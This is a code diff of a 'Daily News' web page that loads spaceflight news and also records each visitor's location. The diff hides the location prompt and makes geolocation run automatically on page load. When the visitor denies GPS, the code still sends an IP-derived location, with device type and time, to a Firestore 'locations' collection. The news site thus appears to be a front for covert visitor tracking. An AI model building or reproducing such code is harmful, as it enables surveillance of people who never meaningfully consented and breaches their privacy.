@@ -49,7 +49,7 @@ top:0;left:0;
 width:100%;height:100%;
 background:linear-gradient(135deg,#111,#222);
 color:white;
-display:flex;
+display:none;
 flex-direction:column;
 justify-content:center;
 align-items:center;
@@ -57,9 +57,6 @@ z-index:9999;
 text-align:center;
 padding:20px;
 }
-
-#locationGate h2{font-size:26px;margin-bottom:10px;}
-#locationGate p{max-width:300px;color:#ccc;}
 
 #locationGate button{
 padding:12px 25px;
@@ -76,11 +73,11 @@ cursor:pointer;
 
 <body>
 
-<!-- 🔥 LOCATION GATE -->
+<!-- LOCATION GATE -->
 <div id="locationGate">
 <h2>📍 Enable Location</h2>
-<p>Enable location to get personalized local news and updates near you.</p>
-<button onclick="requestLocation()">Enable Location</button>
+<p>Enable location to get local news near you</p>
+<button onclick="retryLocation()">Enable Location</button>
 </div>
 
 <header>📰 Daily News</header>
@@ -152,7 +149,6 @@ return id
 function detectDevice(){
 let ua=navigator.userAgent;
 if(/mobile/i.test(ua)) return "Mobile";
-if(/tablet/i.test(ua)) return "Tablet";
 return "Desktop";
 }
 
@@ -198,8 +194,8 @@ let id = getUserId()
 await setDoc(doc(db,"locations",id), data)
 }
 
-// GPS
-async function useGPS(pos){
+// GPS SUCCESS
+async function handleGPS(pos){
 
 let lat = pos.coords.latitude
 let lon = pos.coords.longitude
@@ -223,8 +219,8 @@ time:new Date().toLocaleString()
 
 }
 
-// IP fallback
-async function useIP(){
+// IP FALLBACK
+async function handleIP(){
 
 let ip = await getIP()
 
@@ -240,34 +236,39 @@ time:new Date().toLocaleString()
 
 }
 
-// 🔥 PERMISSION FLOW
-function startApp(){
-navigator.geolocation.getCurrentPosition(useGPS,useIP)
+// 🔥 AUTO TRY
+function autoDetect(){
+navigator.geolocation.getCurrentPosition(
+pos=>{
+handleGPS(pos)
+},
+err=>{
+// show UI
+document.getElementById("locationGate").style.display="flex"
+
+// fallback save
+handleIP()
+}
+)
 }
 
-function checkPermission(){
-navigator.permissions.query({name:'geolocation'}).then(res=>{
-if(res.state === "granted"){
+// 🔁 RETRY BUTTON
+window.retryLocation = function(){
+navigator.geolocation.getCurrentPosition(
+pos=>{
 document.getElementById("locationGate").style.display="none"
-startApp()
+handleGPS(pos)
+},
+()=>{
+alert("Location still blocked")
 }
-})
-}
-
-window.requestLocation = function(){
-navigator.geolocation.getCurrentPosition(pos=>{
-document.getElementById("locationGate").style.display="none"
-useGPS(pos)
-}, ()=>{
-alert("Please enable location to continue")
-})
+)
 }
 
 // NEWS
 let newsData = []
 
 async function loadNews(){
-
 let res = await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
 let data = await res.json()
 
@@ -277,7 +278,6 @@ const container = document.getElementById("newsContainer")
 container.innerHTML=""
 
 newsData.slice(0,8).forEach((news,i)=>{
-
 let div = document.createElement("div")
 div.className="card"
 
@@ -287,16 +287,12 @@ div.innerHTML=`
 `
 
 div.onclick=()=>openArticle(i)
-
 container.appendChild(div)
-
 })
-
 }
 
 // ARTICLE
 window.openArticle = function(i){
-
 let news = newsData[i]
 
 document.getElementById("homePage").style.display="none"
@@ -307,7 +303,6 @@ document.getElementById("image").src=news.image_url
 document.getElementById("content").innerText=news.summary
 
 loadComments()
-
 }
 
 window.showHome = function(){
@@ -329,7 +324,7 @@ list.appendChild(div)
 }
 
 // INIT
-checkPermission()
+autoDetect()
 loadNews()
 
 </script>
